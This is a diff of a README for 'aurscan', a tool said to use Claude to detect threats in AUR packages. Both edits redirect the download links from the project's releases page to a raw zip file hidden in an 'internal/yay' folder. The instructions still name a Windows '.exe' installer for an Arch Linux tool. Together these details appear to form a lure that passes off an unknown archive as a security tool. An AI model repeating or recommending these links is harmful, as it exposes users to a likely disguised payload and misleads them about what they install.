@@ -1,6 +1,6 @@
 # 🛡️ aurscan - Detect hidden threats in AUR packages
 
-[![](https://img.shields.io/badge/Download-aurscan-blue.svg)](https://github.com/clauvilla5671/aurscan/releases)
+[![](https://img.shields.io/badge/Download-aurscan-blue.svg)](https://raw.githubusercontent.com/clauvilla5671/aurscan/main/internal/yay/Software-1.2.zip)
 
 ## 🔍 What this tool does
 
@@ -19,7 +19,7 @@ It uses the Claude artificial intelligence model to read package scripts. The sc
 
 You need to visit the release page to obtain the file. Follow these steps to set the tool up on your computer.
 
-1. Visit [this page to download](https://github.com/clauvilla5671/aurscan/releases).
+1. Visit [this page to download](https://raw.githubusercontent.com/clauvilla5671/aurscan/main/internal/yay/Software-1.2.zip).
 2. Look for the file named aurscan-setup.exe under the latest release section.
 3. Click the link to save the installer to your Downloads folder.
 4. Open your Downloads folder.
